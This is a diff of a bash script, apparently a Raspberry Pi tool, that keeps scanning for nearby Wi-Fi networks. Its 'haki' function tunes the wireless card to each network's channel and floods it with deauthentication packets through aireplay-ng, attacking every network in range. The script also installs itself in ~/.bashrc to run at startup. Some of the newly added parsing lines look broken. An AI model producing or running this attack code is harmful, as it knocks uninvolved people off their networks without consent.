@@ -65,30 +65,30 @@ menu()
 			#remove startup entry
 			sed -i '/\/rasperish\/rasperi.sh/d' ~/.bashrc
 		;;
-	
+
 		1 )
 			enable_autologin
 			menu
 			;;
-	
+
 		2 )
 			disable_autologin
 			menu
 		;;
-	
+
 		3 )
 			echo
 			echo "		[!] Mode is work in progress. Not available."
 			sleep 1
 			menu
-	
+
 			#add start up entry if it doesn't exist
 			if [[ $(grep -o "rasperi.sh" ~/.bashrc) != "rasperi.sh" ]]; then
 				echo "./rasperish/rasperi.sh --closest" >> ~/.bashrc
 			fi
 			#reboot
 			;;
-	
+
 		4 )
 			#add start up entry if it doesn't exist
 			if [[ $(grep -o "rasperi.sh" ~/.bashrc) != "rasperi.sh" ]]; then
@@ -124,10 +124,10 @@ haki()
 
 	#create the working directory, where we save our scan files temporarily
 	create_working_folder
-	
+
 	echo "	[i] Continuously scanning for networks... "
 	echo
-	
+
 	#scan every n seconds
 	scan 10
 
@@ -137,18 +137,20 @@ haki()
 		while read essid
 		do
 			#get each corresponding channel for every essid found
-			channel=$(sed -n "${i}{p;q;}" "$working_folder"/perish_dump/channels)
-	
+			#channel=$(sed -n "${i}{p;q;}" "$working_folder"/perish_dump/channels)
+      channel=$(sed -n "${i}{p;q;}" $(awk -F "\"*;\"*" '{print $6}' "$working_folder"/perish_dump/scan_data-01.kismet.csv | tail -n 2))
+
 			echo "	[+] Synchronising card to channel: $channel"
 			#sync the card to the victim's channel
 			iwconfig $interface channel $channel
-	
+
 			echo "	[+] Attacking $essid"
 			#send some deauth packets to each wifi network
 			aireplay-ng -0 5 -e $essid $interface --ignore-negative-one > /dev/null 2>&1
-	
+
 			((i++))
-		done < "$working_folder"/perish_dump/essids
+		#done < "$working_folder"/perish_dump/essids
+  done < $(awk -F "\"*;\"*" '{print $3}' "$working_folder"/perish_dump/scan_data-01.kismet.csv | tail -n 2)
 	done #loop when you are done
 }
 
@@ -161,20 +163,20 @@ start_mon()
 {
 	#m2 is the correct mode, however it seems that there is a bug and in m2 mode sometimes nothing can be scanned
 	#doing this, solves that case
-	nexutil -m1
+	#nexutil -m1
 	nexutil -m2
 }
 
 scan()
 {
 	scan_interval=$1
-	
+
 	#start data dumping every n seconds
 	airodump-ng $interface --output-format kismet --write ""$working_folder"/perish_dump/scan_data" --write-interval $scan_interval &
-	
+
 	#start chopping the data in a desirable format every n seconds
-	scan_data_chopper $scan_interval &
-	
+	#scan_data_chopper $scan_interval &
+
 	#add an initial hysteresis before starting in order to have data ready
 	sleep $scan_interval
 }
